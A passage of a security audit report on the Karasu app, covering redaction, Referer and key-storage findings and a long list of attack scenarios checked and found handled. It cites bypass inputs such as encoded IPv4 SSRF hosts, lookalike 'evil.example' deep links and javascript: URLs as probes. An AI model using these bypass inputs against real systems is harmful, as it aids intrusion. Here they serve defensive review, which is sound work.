stored sign-in" honesty `migrate_to_portable_file` uses rather than deleting
anything. At minimum, say in the pane's copy that the sign-in does not come
back.

Regression Tests Required:
The existing crypto tests cover seal/open; what is missing is a round trip of
the *migration pair*. Add a test that seals a token to a temp `token_file()`,
runs the new migrate-back, and asserts (a) the file is gone and (b) the returned
plaintext matches — plus a negative case asserting the file is **not** removed
when the write-back fails.

Confidence: HIGH

---

ID: B1-05

Severity: P4

Category: SECURITY RISK

File: /home/user/Karasu/src-tauri/src/diagnostics.rs

Line: 96-112

Function: `redact_home`

Problem:
`redact_home` returns from inside the marker loop on the first match, so it
replaces **at most one** home-directory segment per input string. It is applied
per log line by `export_diagnostics`
(/home/user/Karasu/src-tauri/src/commands/system.rs:428-432), so any single log
line naming two home paths keeps the user's account name in the second one,
inside an artefact whose whole purpose is to be pasted into a public issue.

Expected Behavior:
Every `\Users\<name>\`, `/Users/<name>/` and `/home/<name>/` in the string is
replaced.

Actual Behavior:
`redact_home("copied /home/kyu/a to /home/kyu/b")` yields
`"copied /home/<user>/a to /home/kyu/b"`.

Reproduction:
Call `redact_home` with any two-path string, or trigger a log line that formats
two paths and then use About → Save report with redaction on.

Impact:
Latent. Every `logging::{error,warn,info,debug}` call site that formats a path
(`playback/relations.rs:131,190`, `library.rs:1372`, `anilist/auth.rs:65,252,284`)
formats exactly one, so no *current* line triggers it — which is why this is P4
and not higher. It is a redaction primitive that silently under-redacts, one
`format!` away from mattering, and the test
(`a_home_directory_loses_the_user_name`, diagnostics.rs:281-294) only exercises
single-occurrence inputs, so the suite cannot catch the day it does.

Root Cause:
`path.find(marker)` + early `return` instead of an iterative replace.

Recommended Fix:
Loop until no marker remains (or build the output with a single left-to-right
scan across all three markers), then return.

Regression Tests Required:
Add `redact_home("copied /home/kyu/a to /home/kyu/b")` →
`"copied /home/<user>/a to /home/<user>/b"`, and a mixed-marker case
(`C:\Users\Kyu\… and /home/kyu/…`).

Confidence: HIGH

---

ID: B1-06

Severity: P4

Category: DOCUMENTATION ISSUE

File: /home/user/Karasu/src-tauri/src/commands/images.rs

Line: 86-89 (and the same claim at /home/user/Karasu/src/components/RichText.tsx:75-77 and in the repository's root SECURITY.md)

Function: `fetch_bio_image`

Problem:
The comment states the proxied request is made "with a size cap, a content-type
allowlist, a timeout, no cookies and no `Referer`". Cookies are indeed off (the
`cookies` feature is not enabled on the `reqwest` dependency,
src-tauri/Cargo.toml:76, and the store is opt-in regardless). `Referer` is not:
reqwest 0.13.4's `ClientBuilder` defaults `referer: true`
(`~/.cargo/registry/…/reqwest-0.13.4/src/async_impl/client.rs:312`, wired into
the redirect policy at client.rs:1018), and `net::client_builder`
(src-tauri/src/net.rs:33-40) is a bare `reqwest::Client::builder()` on desktop
that adds only TLS configuration on Android. Nothing calls `.referer(false)`,
and neither does `fetch_bio_image` (images.rs:101-113), so **every redirect hop
carries a `Referer` naming the previous URL**.

Expected Behavior:
Either no `Referer` is sent, or the comment does not claim one is not.

Actual Behavior:
The initial request carries none (reqwest only synthesises the header on
redirects), so the claim holds for the common case and fails on the redirect
path.

Reproduction:
Point a bio image at a host that 302s elsewhere and observe the second request's
`Referer`.

Impact:
Negligible in practice — the value disclosed is the attacker's own first URL, to
a host the attacker chose. It matters as an accuracy problem in a file that is
otherwise scrupulous about stating residual exposure, and because the same
sentence is repeated in the root SECURITY.md where readers will take it
literally.

Root Cause:
A reqwest default that was assumed rather than checked — exactly the shape
CLAUDE.md's "a comment asserting what a dependency cannot do needs rechecking
when that dependency is bumped" note describes.

Recommended Fix:
Add `.referer(false)` to the builder in `fetch_bio_image` (not to
`net::client_builder`, which the AniList and updater clients also use). Then the
comment becomes true rather than needing to be softened.

Regression Tests Required:
None practical without a live server; the one-line builder change is
self-evidencing. If wanted, assert on the `Debug` output of the built client,
which prints `referer` only when enabled (client.rs:2793).

Confidence: HIGH

---

ID: B1-09

Severity: P4

Category: DOCUMENTATION ISSUE

File: /home/user/Karasu/src-tauri/src/anilist/auth.rs

Line: 150 (and /home/user/Karasu/src-tauri/src/commands/auth.rs:122, and CLAUDE.md:172)

Function: module documentation for the Android token store

Problem:
Three places state flatly that the Android token-sealing key is
"hardware-backed": `anilist/auth.rs:150` ("key hardware-backed"),
`commands/auth.rs:122` ("the hardware key") and the CLAUDE.md hard-constraints
bullet. `TokenCipher.key()`
(/home/user/Karasu/src-tauri/gen/android/app/src/main/java/dev/kyu/karasu/TokenCipher.kt:29-44)
builds a `KeyGenParameterSpec` with `setBlockModes`, `setEncryptionPaddings` and
`setKeySize(256)` and nothing else — no `setIsStrongBoxBacked(true)`, and no
post-generation `KeyInfo.isInsideSecureHardware()` check. AndroidKeyStore keys
are TEE-backed on the overwhelming majority of shipping devices but are software
("Keymaster in the framework") on some, and nothing in the code establishes
which one a given device gave out.

Expected Behavior:
The claim matches what the code guarantees, or is hedged.

Actual Behavior:
The root SECURITY.md already hedges correctly ("hardware-backed **where the
device offers that**", SECURITY.md:17-18), so the documents disagree with each
other.

Verification: the citation was corrected. The original report placed the claim at
`keystore.rs:7-9`, which actually says "AES-256-GCM under a key that never
leaves the Android Keystore" — accurate, and no hardware claim. The three
locations above are the ones to fix.

Reproduction: read the four files.

Impact:
None at runtime. It is the kind of drift that turns into a wrong answer in a
future threat-model discussion.

Root Cause:
A property of the platform stated as a property of the code.

Recommended Fix:
Reword `anilist/auth.rs:150`, `commands/auth.rs:122` and the CLAUDE.md bullet to
match the root SECURITY.md's phrasing. Optionally query
`KeyInfo.isInsideSecureHardware()` once and log it, so a diagnostics report can
answer the question for a real device.

Regression Tests Required: none.

Confidence: HIGH

---

## Verified sound

Scenarios traced and found correctly handled, with the guard that handles each.
This is the audit's coverage, not a summary of it.

**SSRF guard — the parts that hold**

- **Decimal, octal and hex IPv4 spellings.** `http://2130706433/a.png` and
  `http://0x7f.1/a.png` both arrive at `host_is_local` already normalised to
  `127.0.0.1` and are refused. Handled by `url::Host::parse_cow` →
  `ends_in_a_number`/`parse_ipv4addr` (url-2.5.8/src/host.rs:115-118, 276-333),
  measured, not assumed.
- **Trailing dot on a numeric host.** `http://127.0.0.1./a` normalises to
  `127.0.0.1` and is refused — same parser path (`parts.pop()` on the empty last
  label, host.rs:335-337). `http://192.168.1.1./a` likewise.
- **Scheme allowlist.** `file:`, `data:` and `ftp:` are refused by the
  `matches!(url.scheme(), "http" | "https")` arm of `url_is_fetchable`
  (images.rs:70); pinned by `only_http_is_attempted` (images.rs:200-209).
- **Every redirect hop is re-checked**, and the chain is capped at three, by the
  `redirect::Policy::custom` closure (images.rs:104-112) — not just the first
  URL. (The predicate it calls is the one B1-01/B1-02 fix.)
- **Content-type allowlist excludes SVG**, so a `data:image/svg+xml` scripting
  context can never be produced; pinned by `svg_is_not_an_allowed_type`
  (images.rs:213-217).
- **The bio image URL and the response are never logged** (images.rs:116-118).
- **No DNS TOCTOU beyond the documented one.** The check is on the URL string
  and the resolution happens inside reqwest at connect; there is no
  resolve-then-recheck window, only the "a hostname that resolves to a private
  address still gets through" case the module header already states as its limit.

**Login / OAuth**

- **Login CSRF.** `/token` requires the 256-bit `PENDING_STATE` nonce
  (login.rs:42-49) compared in constant time (`state_matches`, login.rs:52-58),
  and additionally refuses any request carrying an `Origin` header
  (`has_origin_header`, login.rs:256-260). Pinned by `full_callback_flow`
  (state-less and wrong-state both 403 and do **not** end the window),
  `a_request_carrying_an_origin_is_refused` and
  `the_state_compare_rejects_mismatches_and_empties`.
- **The nonce is effectively single-use**: a state-valid delivery returns `true`
  from `handle_connection`, `serve` returns, and the spawned thread clears
  `PENDING_STATE` and `ACTIVE` (login.rs:126-129).
- **Query-parameter prefix confusion.** `query_param` requires the `=` to follow
  the exact key, so `access_token_x=` and `xaccess_token=` do not satisfy a
  lookup for `access_token`; pinned by `key_prefix_does_not_match`.
- **The local server reflects nothing.** `page()` and `respond()` interpolate
  only compile-time constants (login.rs:296-360), so there is no XSS surface on
  `http://localhost:46231`.
- **Port already occupied** is a clean failure: `bind` errors, `start` resets
  `ACTIVE` and returns `Err` (login.rs:80-86), `useAniListLogin.start` returns
  `false` and the UI falls back to the manual-paste flow rather than opening a
  browser at a port somebody else holds. (A local process that holds the port
  *and* the user then completes a manual-paste login could serve its own
  `/callback` and read the fragment — but that is a local-malware precondition
  under which the credential store is equally readable, so it is not treated as
  a finding.)
- **`set_client_id` is digits-only** (auth.rs:83-91), so nothing can be injected
  into the authorize URL that `authorize_url` builds (auth.rs:410-420); the
  `state` it appends is hex.

**Token storage and secrecy**

- **No command returns either token.** Every `#[tauri::command]` return type in
  the `generate_handler!` list (lib.rs:414-525) was checked: `anilist_session`
  returns the cached viewer blob only (auth.rs:199-204), `sync_status` returns
  `RequestLogEntry`s that carry the root field name and never variables or
  headers (client.rs:207-228, 435-451), and `diagnostics` carries
  `signed_in: bool` — pinned by `the_report_says_whether_signed_in_and_never_more`,
  which greps the serialised struct for token/password/secret/Bearer shapes
  (diagnostics.rs:346-358).
- **Scrubbing happens on write, not on read** (`logging::log`, logging.rs:299-322),
  covering the bearer header, `access_token=`, Jellyfin `"Pw"`, `Token="…"`,
  `X-Emby-Token`, `"AccessToken"`, both file magics, and a base64 catch-all;
  end-to-end proof against the artefact that leaves the machine is
  `no_secret_survives_to_the_file_on_disk` (logging.rs:706-733).
- **`log_frontend_error`** (system.rs:381-386) routes through `logging::error`
  and therefore through `scrub`, so a frontend that stringified something
  sensitive into an error message cannot write it to the file either.
- **`jellyfin_sign_in` never logs the password.** The only place it appears is
  the JSON body at jellyfin.rs:522, and `scrub`'s `"Pw"` rule covers that exact
  shape; the 401 branch deliberately discards the server's body
  (jellyfin.rs:528-532).
- **Jellyfin auth header escaping.** `escape` strips `"` and `\`
  (jellyfin.rs:392-394); a CR/LF cannot inject a header because reqwest rejects
  control characters in a `HeaderValue`. The empty-device floor
  (jellyfin.rs:376-379) is applied *after* escaping, so a quotes-only hostname
  cannot empty the field.
- **`delete_token` clears both stores plus the Linux portable key**
  (auth.rs:56-87), regardless of which mode is active — the documented fix for
  the "signed out of one store" hole — and `portable::token_file()` is
  exe-relative rather than marker-gated (portable.rs:88-93), so the portable
  file is removed even when the marker is gone.
- **`enable_local_mode` deletes the token** (list.rs:579-582) *and*
  `anilist_query` independently refuses to attach a bearer while
  `profile_mode == "local"` (auth.rs:249-253), so the belt-and-braces both work.
- **Linux portable seal.** XChaCha20-Poly1305, a fresh 24-byte OsRng nonce per
  seal, a magic-plus-length guard before slicing, AEAD tamper detection, and a
  wrong key rejected — pinned by `portable_crypto_tests` (auth.rs:560-598),
  including the truncated-file-is-an-error-not-a-panic case.
- **`portable_key` fails closed**: a locked collection or absent D-Bus is an
  error, never "no key yet", so an existing `token.dat` is never orphaned by a
  silently regenerated key (auth.rs:492-509).
- **Android framing.** `classify` handles empty, short and near-miss magics
  without panicking and a bare magic is `Sealed` with an empty payload (so
  `"KRSA1"` can never be read as somebody's token); pinned by the four tests at
  keystore.rs:153-186. The legacy-plaintext migration keeps the session alive on
  a failed re-wrap (auth.rs:207-232), and an undecryptable file reads as signed
  out rather than crash-looping.
- **The iOS / other-mobile plaintext arm (auth.rs:258-288) is unreachable in any
  shipped build.** `keyring` is declared only under `cfg(windows)` and
  `cfg(target_os = "linux")` (Cargo.toml:120-121, 145-161) so a macOS/iOS build
  fails at the manifest; `src-tauri/gen/` contains `android` and `schemas` and no
  iOS project; and the bundle targets are `nsis` + `appimage`. It is dead code by
  construction, not a live weak path.
- **The widget projection** is written to the app-private data dir
  (`mobile_secret_file("widgets.json")`, widgets.rs:234) and cleared on logout
  (auth.rs:212 → `widgets::clear`), so it cannot outlive the account.

**IPC boundary**

- **The capability set is minimal and deliberately narrower than
  `opener:default`** (capabilities/default.json): `allow-reveal-item-in-dir` is
  excluded, and the granted `opener:allow-default-urls` scope is exactly
  `mailto:*`, `tel:*`, `http://*`, `https://*` (verified in
  gen/schemas/acl-manifests.json), so the page cannot ask the OS to open a
  `file:` or custom-scheme URL. Notification, dialog and updater are driven from
  Rust and are correctly absent.
- **Every `openUrl` argument reachable from untrusted text passes `safeHref`**
  (anilistMarkdown.ts:168-172): `https?://…` or a leading single slash, so
  `javascript:`, `data:`, `vbscript:` and protocol-relative `//host` are all
  rejected before a node is even created. The remaining `openUrl` call sites
  take AniList-issued `siteUrl`/`externalLinks` values, which the opener scope
  constrains to http/https anyway.
- **`save_image`, `save_text`, `open_text`, `export_diagnostics` and
  `open_backup_dir` never take a path from the WebView** — the path comes from a
  Rust-driven native dialog or from `app_data_dir()`, and `open_text` caps the
  read at 16 MiB (system.rs:518-540). `save_image` validates `format` against a
  two-item allowlist before it becomes a file extension. (`set_library_path` is
  the exception to this pattern — see B1-11.)
- **`play_next`/`play_episode` take a media id, not a filename.** The path is
  looked up in the on-disk index (library.rs:1261-1305), existence-checked, and
  passed to `Command::new(player).arg("--input-ipc-server=…").arg("--").arg(path)`
  — an argv array with no shell, and `--` before the filename so a leading-dash
  filename cannot become an option (library.rs:1323-1329). (The *player* is the
  page-controlled part — see B1-07.)
- **SQL is parameterised throughout.** The single `format!` into a statement
  (db.rs:983) interpolates a compile-time-constant `sql` fragment and binds the
  media type as `?1`.
- **`offline_queue` is user-scoped** on read, count and discard
  (db.rs:811, 841, 866) — the v16 fix — so signing out of one account and into
  another cannot drain the first account's edits onto the second's list. The
  unscoped `DELETE … WHERE id = ?1` at db.rs:830 is fed ids that came from the
  scoped select.

**Untrusted AniList content**

- **There is no `dangerouslySetInnerHTML` anywhere in `src/`** — every hit is a
  comment saying there must not be one. Both parsers
  (`lib/anilistHtml.ts`, `lib/anilistMarkdown.ts`) emit a typed node union and
  `RichText`/`Markdown` map it to elements, so there is no HTML string for an
  attribute or event handler to be injected into.
- **`parseAniListHtml` cannot emit a link or a chip at all** — its node
  vocabulary is `text`/`br`/`strong`/`em`/`spoiler` — so a media description
  cannot produce a clickable target of any kind. `script` and `style` lose their
  contents (RE.dropWhole/dropDangling, anilistHtml.ts:37-38); every other tag is
  dropped and its text kept.
- **The parsers terminate.** `parseAniListHtml` uses an explicit stack rather
  than recursion (so unbalanced stranger HTML cannot overflow), every branch
  advances `i` by its own match length rather than by `lastIndex`, and both
  parsers truncate the input to 8000 characters first
  (anilistHtml.ts:77-78, anilistMarkdown.ts:156).
- **`Markdown`'s dynamic heading tag** is bounded: `h${n.level}` is built from a
  parser-produced level of 1-6.
- **Spoilers are hidden by absence, not by CSS** (`Spoiler`, RichText.tsx:215-233),
  so the text is not in the DOM or the a11y tree until asked for.
- **Middle-clicking a link in untrusted text cannot navigate the app window** —
  the new-window request both shipped engines raise is swallowed with no handler
  configured. See the Refuted section for the evidence.

**Deep links**

- **`onOpenUrl` funnels every incoming URL through `internalRoute`**
  (App.tsx:96-105) and navigates only on a non-null result. `internalRoute`
  requires `^https?://(?:www\.)?anilist\.co/` (anilistUrl.ts:25) — so
  `https://anilist.co.evil.example/…` and `https://evil/#https://anilist.co/…`
  both fail — strips query and fragment before matching, and every emitted route
  is built from captured digits or `encodeURIComponent(name)`. A `karasu://…`
  URL, including one an arbitrary app or web page can fire at the exported
  BROWSABLE intent filter, yields `null` and is dropped.
- **The Android ACTION_SEND rewrite** extracts the first `https?://\S+` and
  builds an `ACTION_VIEW` pinned to `setPackage(packageName)`
  (MainActivity.kt:23-29), so it cannot be used to launch another app, and the
  result still has to survive `internalRoute`.
- **The manifest exposes nothing else**: the FileProvider, the notification job
  service and all four widget receivers are `android:exported="false"`.

**Updater**

- **The minisign signature is verified before the bytes are returned.**
  `Update::download` calls `verify_signature(&buffer, &self.signature,
  &self.config.pubkey)` at tauri-plugin-updater-2.10.1/src/updater.rs:712, i.e.
  before `download_pending_update` ever stashes them and before
  `install_pending_update` passes them to `install`. The custom
  `version_comparator` (update.rs:563-572) runs inside `check()` and decides only
  *whether* an update is offered — it cannot reach the verification. `pubkey` is
  present in tauri.conf.json and `dangerousDisableAssetCspModification` /
  `dangerous_accept_invalid_certs` are not set anywhere.
  (Residual, inherent to the plugin and not a defect here: the signature covers
  the *artifact*, not the manifest, so a party who controls the manifest URL
  could point a newer-looking version at an older signed build. Both the manifest
  and the artifact come from GitHub over HTTPS, and the comparator refuses
  anything not strictly newer than the running four-part version.)
- **Android cannot be updated by this path**: `updater_available()` answers false
  and `download_pending_update` returns early (update.rs:517-523).

**CSP and secrets**

- The production CSP has `script-src 'self'` with no `unsafe-inline`/`unsafe-eval`,
  `object-src 'none'`, `frame-src 'none'`, `base-uri 'self'`, `form-action 'none'`,
  and `img-src 'self' data: https://*.anilist.co` — `data:` being load-bearing for
  the inlined mark and for the bio-image proxy's return value. `devCsp` is
  separate and only the dev one is loose. `withGlobalTauri` is not enabled.
- **No client secret exists in the tree.** The only credential-shaped constant is
  `BUILTIN_ANILIST_CLIENT_ID = "46231"` (auth.rs:13), which is a public
  identifier; the login flow is implicit-grant only.
- **localStorage holds UI preferences only** — cover columns, accent, status
  colours, reduce-motion, view mode, presets, sidebar width, default add status,
  language. No token, no viewer id, nothing sensitive.

## Refuted during verification

**B1-08 — middle-click on a bio link navigates the app window away
(`src/components/RichText.tsx:48-59`).** Claimed: `ExternalAnchor` renders a real
`<a href>` and cancels the navigation in a React `onClick`, which does not fire
for the middle button (`auxclick` does), so a middle-click on a stranger's link
may replace the app window with a remote page. It is not a defect. Middle-click's
default action on an anchor is a *new-window request*, not a same-frame
navigation, and both shipped engines dead-end there: wry registers
`add_NewWindowRequested` unconditionally on WebView2 and, with no handler
configured, takes the branch that calls `args.SetHandled(true)` and creates no
window (wry-0.55.1/src/webview2/mod.rs:702-782); on WebKitGTK `connect_create` is
only wired when a handler exists (wry-0.55.1/src/webkitgtk/mod.rs:487-489) and
Karasu configures none. Tauri installs a new-window handler only when the app
supplies one (tauri-runtime-wry-2.11.4/src/lib.rs:4908-4911), and Karasu supplies
neither that nor a navigation handler. There is no mechanism by which the claimed
impact occurs. (Worth keeping as free hardening rather than as a finding: no
`on_navigation` guard is registered anywhere in `src-tauri` — grepped, zero hits
— and the CSP does not constrain navigation, so any *future* same-frame
navigation would leave the app origin unchecked. `onAuxClick={(e) =>
e.preventDefault()}` costs one line.)

## Counts

| Severity | Count |
|---|---|
| P0 | 0 |
| P1 | 0 |
| P2 | 0 |
| P3 | 3 |
| P4 | 8 |
| **Total findings** | **11** |
| Refuted during verification | 1 |
